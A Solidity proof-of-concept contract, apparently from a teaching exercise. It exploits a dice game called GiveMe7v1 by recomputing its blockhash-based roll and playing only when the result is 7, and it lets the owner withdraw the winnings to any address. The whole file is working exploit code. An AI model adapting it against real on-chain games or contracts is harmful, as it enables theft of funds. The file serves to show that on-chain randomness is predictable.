// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "hardhat/console.sol";
import "./GiveMe7v1.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error Hack__NotEnoguhEth();
error Hack__NotRolled7();
error Hack__TransferFailed();

/**
 * @title Hack GiveMe7v1, POC
 * @author @0xJayPi
 * @notice A demo to show that random numbers cannot be generating using on-chain data
 * @dev I used a hack7() in GiveMe7.test to predict when you could get a 7. If this POC was only made in a testnet, all the calculations could be done inside this contract
 * @custom:poc This is a Proxy POC
 */
contract RiggedRoll is Ownable {
    GiveMe7v1 public immutable i_giveMe7v1;

    /**
     * @notice constructor called when contract deployed
     * @dev Set the address of the contract to hack
     * @param gameAddress Addres of the contract to hack
     */
    constructor(address payable gameAddress) {
        i_giveMe7v1 = GiveMe7v1(gameAddress);
    }

    /**
     * @notice Function needed to let the contract receive ETH
     * @dev This contract needs a balance > 0.002 ether cause giveMe7v1.rollTheDice() requires at least this value
     */
    receive() external payable {}

    /**
     * @notice This function calls the victim contract
     * @dev I run the logic here as well to double check that you're getting a 7 when called
     */
    function riggedRoll() public {
        if (address(this).balance < 0.002 ether) {
            revert Hack__NotEnoguhEth();
        }

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(i_giveMe7v1), i_giveMe7v1.getNonce())
        );
        uint256 roll = uint256(hash) % 9;

        if (roll != 7) {
            revert Hack__NotRolled7();
        }

        console.log("Hack rolling the dice", roll);
        i_giveMe7v1.rollTheDice{value: 0.002 ether}();
    }

    /**
     * @notice Withdraw from the contract to the owner
     * @dev I added _addr because when hacking it's common to se pivoting between contracts
     * @param _addr The address of the EOA or contract to withdraw ETH to
     * @param _amount Amount of ETH to withdraw
     */
    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
        (bool success, ) = payable(_addr).call{value: _amount}("");
        if (!success) {
            revert Hack__TransferFailed();
        }
    }
}
